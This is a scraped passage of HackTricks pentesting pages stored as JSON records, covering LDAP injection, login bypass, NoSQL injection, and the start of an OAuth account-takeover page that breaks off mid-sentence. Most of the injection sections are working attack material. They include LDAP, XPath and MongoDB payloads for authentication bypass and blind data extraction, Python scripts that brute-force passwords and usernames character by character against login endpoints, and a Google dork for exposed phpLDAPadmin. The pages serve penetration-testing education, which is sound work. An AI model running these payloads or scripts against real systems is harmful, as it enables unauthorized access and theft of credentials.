[final]\nInitial\n= assertionvalue\nFinal\n= assertionvalue\n(&)\n= Absolute TRUE\n(|)\n= Absolute FALSE\nFor example:\n(&(!(objectClass=Impresoras))(uid=s*))\n(&(objectClass=user)(uid=*))\nYou can access to the database, and this can content information of a lot of different types.\nOpenLDAP\n: If 2 filters arrive, only executes the first one.\nADAM or Microsoft LDS\n: With 2 filters they throw an error.\nSunOne Directory Server 5.0\n: Execute both filters.\nIt is very important to send the filter with correct syntax or an error will be thrown. It is better to send only 1 filter.\nThe filter has to start with:\n&\nor\n|\nExample:\n(&(directory=val1)(folder=public))\n(&(objectClass=VALUE1)(type=Epson*))\nVALUE1 = *)(ObjectClass=*))(&(objectClass=void\nThen:\n(&(objectClass=\n*)(ObjectClass=*))\nwill be the first filter (the one executed).\nLogin Bypass\nLDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed.\nuser\n=\n*\npassword\n=\n*\n--\n>\n(\n&\n(\nuser\n=\n*\n)(\npassword\n=\n*\n))\n# The asterisks are great in LDAPi\nuser\n=\n*\n)(\n&\npassword\n=\n*\n)(\n&\n--\n>\n(\n&\n(\nuser\n=\n*\n)(\n&\n)(\npassword\n=\n*\n)(\n&\n))\nuser\n=\n*\n)(\n|\n(\n&\npass\n=\npwd\n)\n--\n>\n(\n&\n(\nuser\n=\n*\n)(\n|\n(\n&\n)(\npass\n=\npwd\n))\nuser\n=\n*\n)(\n|\n(\npassword\n=\n*\npassword\n=\ntest\n)\n--\n>\n(\n&\n(\nuser\n=\n*\n)(\n|\n(\npassword\n=\n*\n)(\npassword\n=\ntest\n))\nuser\n=\n*\n))\n%00\npass\n=\nany\n--\n>\n(\n&\n(\nuser\n=\n*\n))\n%00 --\n>\nNothing\nmore\nis executed\nuser\n=\nadmin\n)(\n&\n)\npassword\n=\npwd\n--\n>\n(\n&\n(\nuser\n=\nadmin\n)(\n&\n))(\npassword\n=\npwd\n)\n#Can through an error\nusername\n=\nadmin\n)(\n!\n(\n&\n(\n|\npass\n=\nany\n))\n--\n>\n(\n&\n(\nuid\n=\nadmin\n)(\n!\n(\n&\n(\n|\n)\n(\nwebpassword\n=\nany\n))))\n‚Äî\n>\nAs\n(\n|\n)\nis FALSE\nthen\nthe user is admin and the password check is True.\nusername\n=\n*\npassword\n=\n*\n)(\n&\n--\n>\n(\n&\n(\nuser\n=\n*\n)(\npassword\n=\n*\n)(\n&\n))\nusername\n=\nadmin\n))(\n|\n(\n|\npassword\n=\nany\n--\n>\n(\n&\n(\nuid\n=\nadmin\n))\n(\n|\n(\n|\n)\n(\nwebpassword\n=\nany\n))\nLists\n‚Äã\nLDAP_FUZZ\n‚Äã\n‚Äã\nLDAP Attributes\n‚Äã\n‚Äã\nLDAP PosixAccount attributes\n‚Äã\nBlind LDAP Injection\nYou may force False or True responses to check if any data is returned and confirm a possible Blind LDAP Injection:\n#This will result on True, so some information will be shown\nPayload: *\n)(\nobjectClass\n=\n*\n))(\n&\nobjectClass\n=\nvoid\nFinal query:\n(\n&\n(\nobjectClass\n=\n*\n)(\nobjectClass\n=\n*\n))(\n&\nobjectClass\n=\nvoid\n)(\ntype\n=\nPepi*\n))\n#This will result on True, so no information will be returned or shown\nPayload: void\n)(\nobjectClass\n=\nvoid\n))(\n&\nobjectClass\n=\nvoid\nFinal query:\n(\n&\n(\nobjectClass\n=\nvoid\n)(\nobjectClass\n=\nvoid\n))(\n&\nobjectClass\n=\nvoid\n)(\ntype\n=\nPepi*\n))\nDump data\nYou can iterate over the ascii letters, digits and symbols:\n(\n&\n(\nsn\n=\nadministrator\n)(\npassword\n=\n*\n))\n:\nOK\n(\n&\n(\nsn\n=\nadministrator\n)(\npassword\n=\nA*\n))\n:\nKO\n(\n&\n(\nsn\n=\nadministrator\n)(\npassword\n=\nB*\n))\n:\nKO\n..\n.\n(\n&\n(\nsn\n=\nadministrator\n)(\npassword\n=\nM*\n))\n:\nOK\n(\n&\n(\nsn\n=\nadministrator\n)(\npassword\n=\nMA*\n))\n:\nKO\n(\n&\n(\nsn\n=\nadministrator\n)(\npassword\n=\nMB*\n))\n:\nKO\n..\n.\nScripts\nDiscover valid LDAP fields\nLDAP objects\ncontains by default several attributes\nthat could be used to\nsave information\n. You can try to\nbrute-force all of them to extract that info.\nYou can find a list of\ndefault LDAP attributes here\n.\n#!/usr/bin/python3\nimport\nrequests\nimport\nstring\nfrom\ntime\nimport\nsleep\nimport\nsys\n‚Äã\nproxy\n=\n{\n\"http\"\n:\n\"localhost:8080\"\n}\nurl\n=\n\"http://10.10.10.10/login.php\"\nalphabet\n=\nstring\n.\nascii_letters\n+\nstring\n.\ndigits\n+\n\"_@{}-/()!\\\"$%=^[]:;\"\n‚Äã\nattributes\n=\n[\n\"c\"\n,\n\"cn\"\n,\n\"co\"\n,\n\"commonName\"\n,\n\"dc\"\n,\n\"facsimileTelephoneNumber\"\n,\n\"givenName\"\n,\n\"gn\"\n,\n\"homePhone\"\n,\n\"id\"\n,\n\"jpegPhoto\"\n,\n\"l\"\n,\n\"mail\"\n,\n\"mobile\"\n,\n\"name\"\n,\n\"o\"\n,\n\"objectClass\"\n,\n\"ou\"\n,\n\"owner\"\n,\n\"pager\"\n,\n\"password\"\n,\n\"sn\"\n,\n\"st\"\n,\n\"surname\"\n,\n\"uid\"\n,\n\"username\"\n,\n\"userPassword\"\n,]\n‚Äã\nfor\nattribute\nin\nattributes\n:\n#Extract all attributes\nvalue\n=\n\"\"\nfinish\n=\nFalse\nwhile\nnot\nfinish\n:\nfor\nchar\nin\nalphabet\n:\n#In each possition test each possible printable char\nquery\n=\nf\"*)(\n{\nattribute\n}\n=\n{\nvalue\n}{\nchar\n}\n*\"\ndata\n=\n{\n'login'\n:\nquery\n,\n'password'\n:\n'bla'\n}\nr\n=\nrequests\n.\npost\n(\nurl\n,\ndata\n=\ndata\n,\nproxies\n=\nproxy\n)\nsys\n.\nstdout\n.\nwrite\n(\nf\"\\r\n{\nattribute\n}\n:\n{\nvalue\n}{\nchar\n}\n\"\n)\n#sleep(0.5) #Avoid brute-force bans\nif\n\"Cannot login\"\nin\nr\n.\ntext\n:\nvalue\n+=\nstr\n(\nchar\n)\nbreak\n‚Äã\nif\nchar\n==\nalphabet\n[\n-\n1\n]:\n#If last of all the chars, then, no more chars in the value\nfinish\n=\nTrue\nprint\n()\nSpecial Blind LDAP Injection (without \"*\")\n#!/usr/bin/python3\n‚Äã\nimport\nrequests\n,\nstring\nalphabet\n=\nstring\n.\nascii_letters\n+\nstring\n.\ndigits\n+\n\"_@{}-/()!\\\"$%=^[]:;\"\n‚Äã\nflag\n=\n\"\"\nfor\ni\nin\nrange\n(\n50\n):\nprint\n(\n\"[i] Looking for number \"\n+\nstr\n(\ni\n))\nfor\nchar\nin\nalphabet\n:\nr\n=\nrequests\n.\nget\n(\n\"http://ctf.web??action=dir&search=admin*)(password=\"\n+\nflag\n+\nchar\n)\nif\n(\n\"TRUE CONDITION\"\nin\nr\n.\ntext\n):\nflag\n+=\nchar\nprint\n(\n\"[+] Flag: \"\n+\nflag\n)\nbreak\nGoogle Dorks\nintitle:\n\"phpLDAPadmin\"\ninurl:cmd.php\nMore Payloads\nPayloadsAllTheThings/LDAP Injection at master ¬∑ swisskyrepo/PayloadsAllTheThings\nGitHub\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nJWT Vulnerabilities (Json Web Tokens)\nNext\n- Pentesting Web\nLogin Bypass\nLast modified\n6mo ago"
    },
    {
        "title": "Login Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/login-bypass",
        "text": "Login Bypass\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nBypass regular login\nIf you find a login page, here you can find some techniques to try to bypass it:\nCheck for\ncomments\ninside the page (scroll down and to the right?)\nCheck if you can\ndirectly access the restricted pages\nCheck to\nnot send the parameters\n(do not send any or only 1)\nCheck the\nPHP comparisons error:\nuser[]=a&pwd=b\n,\nuser=a&pwd[]=b\n,\nuser[]=a&pwd[]=b\nChange content type to json\nand send json values (bool true included)\nIf you get a response saying that POST is not supported you can try to send the\nJSON in the body but with a GET request\nwith\nContent-Type: application/json\nCheck nodejs potential parsing error (read\nthis\n):\npassword[password]=1\nNodejs will transform that payload to a query similar to the following one:\nSELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` ``\npassword=password=1\n;\nwhich makes the password bit to be always true.\nIf you can send a JSON object you can send\n\"password\":{\"password\": 1}\nto bypass the login.\nRemember that to bypass this login you still need to\nknow and send a valid username\n.\nAdding\n\"stringifyObjects\":true\noption when calling\nmysql.createConnection\nwill eventually b\nlock all unexpected behaviours when\nObject\nis passed\nin the parameter.\nCheck credentials:\n‚Äã\nDefault credentials\nof the technology/platform used\nCommon combinations\n(root, admin, password, name of the tech, default user with one of these passwords).\nCreate a dictionary using\nCewl\n,\nadd\nthe\ndefault\nusername and password (if there is) and try to brute-force it using all the words as\nusernames and password\nBrute-force\nusing a bigger\ndictionary (\nBrute force\n)\nSQL Injection authentication bypass\n‚Äã\nHere you can find several tricks to bypass the login via\nSQL injections\n.\nIn the following page you can find a\ncustom list to try to bypass login\nvia SQL Injections:\nLogin bypass List\nNo SQL Injection authentication bypass\n‚Äã\nHere you can find several tricks to bypass the login via\nNo SQL Injections\n.\nAs the NoSQL Injections requires to change the parameters value, you will need to test them manually.\nXPath Injection authentication bypass\n‚Äã\nHere you can find several tricks to bypass the login via\nXPath Injection.\n‚Äã\n' or '1'='1\n' or ''='\n' or 1]%00\n' or /* or '\n' or \"a\" or '\n' or 1 or '\n' or true() or '\n'or string-length(name(.))<10 or'\n'or contains(name,'adm') or'\n'or contains(.,'adm') or'\n'or position()=2 or'\nadmin' or '\nadmin' or '1'='2\nLDAP Injection authentication bypass\n‚Äã\nHere you can find several tricks to bypass the login via\nLDAP Injection.\n‚Äã\n*\n*)(&\n*)(|(&\npwd)\n*)(|(*\n*))%00\nadmin)(&)\npwd\nadmin)(!(&(|\npwd))\nadmin))(|(|\nRemember Me\nIf the page has \"\nRemember Me\n\" functionality check how is it implemented and see if you can abuse it to\ntakeover other accounts\n.\nRedirects\nPages usually redirects users after login, check if you can alter that redirect to cause an\nOpen Redirect\n. Maybe you can steal some information (codes, cookies...) if you redirect the user to your web.\nOther Checks\nCheck if you can\nenumerate usernames\nabusing the login functionality.\nCheck if\nauto-complete\nis active in the password/\nsensitive\ninformation\nforms\ninput:\n<input autocomplete=\"false\"\n‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nLDAP Injection\nNext\nLogin bypass List\nLast modified\n6mo ago"
    },
    {
        "title": "NoSQL injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/nosql-injection",
        "text": "NoSQL injection\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.\nExploit\nIn PHP you can send an Array changing the sent parameter from\nparameter=foo\nto\nparameter[arrName]=foo.\nThe exploits are based in adding an\nOperator\n:\nusername\n[\n$ne\n]\n=\n1\n$password\n[\n$ne\n]\n=\n1\n#<Not Equals>\nusername\n[\n$regex\n]\n=\n^adm\n$password\n[\n$ne\n]\n=\n1\n#Check a <regular expression>, could be used to brute-force a parameter\nusername\n[\n$regex\n]\n=\n.\n{\n25\n}\n&\npass\n[\n$ne\n]\n=\n1\n#Use the <regex> to find the length of a value\nusername\n[\n$eq\n]\n=\nadmin\n&\npassword\n[\n$ne\n]\n=\n1\n#<Equals>\nusername\n[\n$ne\n]\n=\nadmin\n&\npass\n[\n$lt\n]\n=\ns\n#<Less than>, Brute-force pass[$lt] to find more users\nusername\n[\n$ne\n]\n=\nadmin\n&\npass\n[\n$gt\n]\n=\ns\n#<Greater Than>\nusername\n[\n$nin\n][\nadmin\n]\n=\nadmin\n&\nusername\n[\n$nin\n][\ntest\n]\n=\ntest\n&\npass\n[\n$ne\n]\n=\n7\n#<Matches non of the values of the array> (not test and not admin)\n{\n$where\n:\n\"this.credits == this.debits\"\n}\n#<IF>, can be used to execute code\nBasic authentication bypass\nUsing not equal ($ne) or greater ($gt)\n#in URL\nusername\n[\n$ne\n]\n=\ntoto\n&\npassword\n[\n$ne\n]\n=\ntoto\nusername\n[\n$regex\n]\n=\n.*\n&\npassword\n[\n$regex\n]\n=\n.*\nusername\n[\n$exists\n]\n=\ntrue\n&\npassword\n[\n$exists\n]\n=\ntrue\n‚Äã\n#in JSON\n{\n\"username\"\n:\n{\n\"\n$ne\n\"\n:\nnull\n}\n,\n\"password\"\n:\n{\n\"\n$ne\n\"\n:\nnull\n}\n}\n{\n\"username\"\n:\n{\n\"\n$ne\n\"\n:\n\"foo\"\n}\n,\n\"password\"\n:\n{\n\"\n$ne\n\"\n:\n\"bar\"\n}\n}\n{\n\"username\"\n:\n{\n\"\n$gt\n\"\n:\nundefined\n}\n,\n\"password\"\n:\n{\n\"\n$gt\n\"\n:\nundefined\n}\n}\nSQL - Mongo\nNormal sql: ' or 1=1-- -\nMongo sql: ' || 1==1//    or    ' || 1==1%00\nExtract\nlength\ninformation\nusername\n[\n$ne\n]\n=\ntoto\n&\npassword\n[\n$regex\n]\n=\n.\n{\n1\n}\nusername\n[\n$ne\n]\n=\ntoto\n&\npassword\n[\n$regex\n]\n=\n.\n{\n3\n}\n# True if the length equals 1,3...\nExtract\ndata\ninformation\nin URL (if length == 3)\nusername[$ne]=toto&password[$regex]=a.{2}\nusername[$ne]=toto&password[$regex]=b.{2}\n...\nusername[$ne]=toto&password[$regex]=m.{2}\nusername[$ne]=toto&password[$regex]=md.{1}\nusername[$ne]=toto&password[$regex]=mdp\n‚Äã\nusername[$ne]=toto&password[$regex]=m.*\nusername[$ne]=toto&password[$regex]=md.*\n‚Äã\nin JSON\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^m\" }}\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }}\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^mdp\" }}\nSQL - Mongo\n/?search=admin' && this.password%00 --> Check if the field password exists\n/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password\n/?search=admin' && this.password && this.password.match(/^a.*$/)%00\n/?search=admin' && this.password && this.password.match(/^b.*$/)%00\n/?search=admin' && this.password && this.password.match(/^c.*$/)%00\n...\n/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00\n...\n/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found\nPHP Arbitrary Function Execution\nUsing the\n$func\noperator of the\nMongoLite\nlibrary (used by default) it might be possible to execute and arbitrary function as in\nthis report\n.\n\"user\"\n:{\n\"$func\"\n:\n\"var_dump\"\n}\nGet info from different collection\nIt's possible to use\n$lookup\nto get info from a different collection. In the following example, we are reading from a\ndifferent collection\ncalled\nusers\nand getting the\nresults of all the entries\nwith a password matching a wildcard.\n[\n{\n\"$lookup\"\n:\n{\n\"from\"\n:\n\"users\"\n,\n\"as\"\n:\n\"resultado\"\n,\n\"pipeline\"\n:\n[\n{\n\"$match\"\n:\n{\n\"password\"\n:\n{\n\"$regex\"\n:\n\"^.*\"\n}\n}\n}\n]\n}\n}\n]\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nBlind NoSQL\nimport\nrequests\n,\nstring\n‚Äã\nalphabet\n=\nstring\n.\nascii_lowercase\n+\nstring\n.\nascii_uppercase\n+\nstring\n.\ndigits\n+\n\"_@{}-/()!\\\"$%=^[]:;\"\n‚Äã\nflag\n=\n\"\"\nfor\ni\nin\nrange\n(\n21\n):\nprint\n(\n\"[i] Looking for char number \"\n+\nstr\n(\ni\n+\n1\n))\nfor\nchar\nin\nalphabet\n:\nr\n=\nrequests\n.\nget\n(\n\"http://chall.com?param=^\"\n+\nflag\n+\nchar\n)\nif\n(\n\"<TRUE>\"\nin\nr\n.\ntext\n):\nflag\n+=\nchar\nprint\n(\n\"[+] Flag: \"\n+\nflag\n)\nbreak\nimport\nrequests\nimport\nurllib3\nimport\nstring\nimport\nurllib\nurllib3\n.\ndisable_warnings\n()\n‚Äã\nusername\n=\n\"admin\"\npassword\n=\n\"\"\n‚Äã\nwhile\nTrue\n:\nfor\nc\nin\nstring\n.\nprintable\n:\nif\nc\nnot\nin\n[\n'*'\n,\n'+'\n,\n'.'\n,\n'?'\n,\n'|'\n]:\npayload\n=\n'{\"username\": {\"$eq\": \"%s\"}, \"password\": {\"$regex\": \"^%s\" }}'\n%\n(\nusername\n,\npassword\n+\nc\n)\nr\n=\nrequests\n.\npost\n(\nu\n,\ndata\n=\n{\n'ids'\n:\npayload\n},\nverify\n=\nFalse\n)\nif\n'OK'\nin\nr\n.\ntext\n:\nprint\n(\n\"Found one more char : %s\"\n%\n(\npassword\n+\nc\n))\npassword\n+=\nc\nMongoDB Payloads\ntrue, $where: '1 == 1'\n, $where: '1 == 1'\n$where: '1 == 1'\n', $where: '1 == 1'\n1, $where: '1 == 1'\n{ $ne: 1 }\n', $or: [ {}, { 'a':'a\n' } ], $comment:'successful MongoDB injection'\ndb.injection.insert({success:1});\ndb.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1\n|| 1==1\n' && this.password.match(/.*/)//+%00\n' && this.passwordzz.match(/.*/)//+%00\n'%20%26%26%20this.password.match(/.*/)//+%00\n'%20%26%26%20this.passwordzz.match(/.*/)//+%00\n{$gt: ''}\n[$ne]=1\nTools\n‚Äã\nhttps://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration\n‚Äã\n‚Äã\nhttps://github.com/C4l1b4n/NoSQL-Attack-Suite\n‚Äã\nBrute-force login usernames and passwords from POST login\nThis is a simple script that you could modify but the previous tools can also do this task.\nimport\nrequests\nimport\nstring\n‚Äã\nurl\n=\n\"http://example.com\"\nheaders\n=\n{\n\"Host\"\n:\n\"exmaple.com\"\n}\ncookies\n=\n{\n\"PHPSESSID\"\n:\n\"s3gcsgtqre05bah2vt6tibq8lsdfk\"\n}\npossible_chars\n=\nlist\n(\nstring\n.\nascii_letters\n)\n+\nlist\n(\nstring\n.\ndigits\n)\n+\n[\n\"\\\\\"\n+\nc\nfor\nc\nin\nstring\n.\npunctuation\n+\nstring\n.\nwhitespace\n]\ndef\nget_password\n(\nusername\n):\nprint\n(\n\"Extracting password of \"\n+\nusername\n)\nparams\n=\n{\n\"username\"\n:\nusername\n,\n\"password[$regex]\"\n:\n\"\"\n,\n\"login\"\n:\n\"login\"\n}\npassword\n=\n\"^\"\nwhile\nTrue\n:\nfor\nc\nin\npossible_chars\n:\nparams\n[\n\"password[$regex]\"\n]\n=\npassword\n+\nc\n+\n\".*\"\npr\n=\nrequests\n.\npost\n(\nurl\n,\ndata\n=\nparams\n,\nheaders\n=\nheaders\n,\ncookies\n=\ncookies\n,\nverify\n=\nFalse\n,\nallow_redirects\n=\nFalse\n)\nif\nint\n(\npr\n.\nstatus_code\n)\n==\n302\n:\npassword\n+=\nc\nbreak\nif\nc\n==\npossible_chars\n[\n-\n1\n]:\nprint\n(\n\"Found password \"\n+\npassword\n[\n1\n:].\nreplace\n(\n\"\\\\\"\n,\n\"\"\n)\n+\n\" for username \"\n+\nusername\n)\nreturn\npassword\n[\n1\n:].\nreplace\n(\n\"\\\\\"\n,\n\"\"\n)\n‚Äã\ndef\nget_usernames\n():\nusernames\n=\n[]\nparams\n=\n{\n\"username[$regex]\"\n:\n\"\"\n,\n\"password[$regex]\"\n:\n\".*\"\n,\n\"login\"\n:\n\"login\"\n}\nfor\nc\nin\npossible_chars\n:\nusername\n=\n\"^\"\n+\nc\nparams\n[\n\"username[$regex]\"\n]\n=\nusername\n+\n\".*\"\npr\n=\nrequests\n.\npost\n(\nurl\n,\ndata\n=\nparams\n,\nheaders\n=\nheaders\n,\ncookies\n=\ncookies\n,\nverify\n=\nFalse\n,\nallow_redirects\n=\nFalse\n)\nif\nint\n(\npr\n.\nstatus_code\n)\n==\n302\n:\nprint\n(\n\"Found username starting with \"\n+\nc\n)\nwhile\nTrue\n:\nfor\nc2\nin\npossible_chars\n:\nparams\n[\n\"username[$regex]\"\n]\n=\nusername\n+\nc2\n+\n\".*\"\nif\nint\n(\nrequests\n.\npost\n(\nurl\n,\ndata\n=\nparams\n,\nheaders\n=\nheaders\n,\ncookies\n=\ncookies\n,\nverify\n=\nFalse\n,\nallow_redirects\n=\nFalse\n).\nstatus_code\n)\n==\n302\n:\nusername\n+=\nc2\nprint\n(\nusername\n)\nbreak\n‚Äã\nif\nc2\n==\npossible_chars\n[\n-\n1\n]:\nprint\n(\n\"Found username: \"\n+\nusername\n[\n1\n:])\nusernames\n.\nappend\n(\nusername\n[\n1\n:])\nbreak\nreturn\nusernames\n‚Äã\n‚Äã\nfor\nu\nin\nget_usernames\n():\nget_password\n(\nu\n)\nReferences\n‚Äã\nhttps://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPrevious\nLogin bypass List\nNext\n- Pentesting Web\nOAuth to Account takeover\nLast modified\n2mo ago"
    },
    {
        "title": "OAuth to Account takeover",
        "url": "https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover",
        "text": "OAuth to Account takeover\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThere are a couple different versions of OAuth, you can read\nhttps://oauth.net/2/\nto get a baseline understanding.\nIn this article, we will be focusing on the most common flow that you will come across today, which is the\nOAuth 2.0 authorization code grant type\n. In essence, OAuth provides developers an\nauthorization mechanism to allow an application to access data or perform certain actions against your account, from another application\n(the authorization server).\nFor example, let‚Äôs say website\nhttps://yourtweetreader.com\nhas functionality to\ndisplay all tweets you‚Äôve ever sent\n, including private tweets. In order to do this, OAuth 2.0 is introduced.\nhttps://yourtweetreader.com\nwill ask you to\nauthorize their Twitter application to access all your Tweets\n. A consent page will pop up on\nhttps://twitter.com\ndisplaying what\npermissions are being requested\n, and who the developer requesting it is. Once you authorize the request,\nhttps://yourtweetreader.com\nwill be\nable to access to your Tweets on behalf of you\n.\nElements which are important to understand in an OAuth 2.0 context:\nresource owner\n: The\nresource owner\nis the\nuser/entity\ngranting access to their protected resource, such as their Twitter account Tweets. In this example, this would be\nyou\n.\nresource server\n: The\nresource server\nis the\nserver handling authenticated requests\nafter the application has obtained an\naccess token\non behalf of the\nresource owner\n. In this example, this would be\nhttps://twitter.com\nclient application\n: The\nclient application\nis the\napplication requesting authorization\nfrom the\nresource owner\n. In this example, this would be\nhttps://yourtweetreader.com\n.\nauthorization server\n: The\nauthorization server\nis the\nserver issuing\naccess tokens\nto the\nclient application\nafter successfully authenticating\nthe\nresource owner\nand obtaining authorization. In the above example, this would be\nhttps://twitter.com\nclient_id\n: The\nclient_id\nis the\nidentifier for the application\n. This is a public,\nnon-secret\nunique identifier.\nclient_secret:\nThe\nclient_secret\nis a\nsecret known only to the application and the authorization server\n. This is used to generate\naccess_tokens\nresponse_type\n: The\nresponse_type\nis a value to detail\nwhich type of token\nis being requested, such as\ncode\nscope\n: The\nscope\nis the\nrequested level of access\nthe\nclient application\nis requesting from the\nresource owner\nredirect_uri\n: The\nredirect_uri\nis the\nURL the user is redirected to after the authorization is complete\n. This usually must match the redirect URL that you have previously registered with the service\nstate\n: The\nstate\nparameter can\npersist data between the user being directed to the authorization server and back again\n. It‚Äôs important that this is a unique value as it serves as a\nCSRF protection mechanism\nif it contains a unique or random value per request\ngrant_type\n: 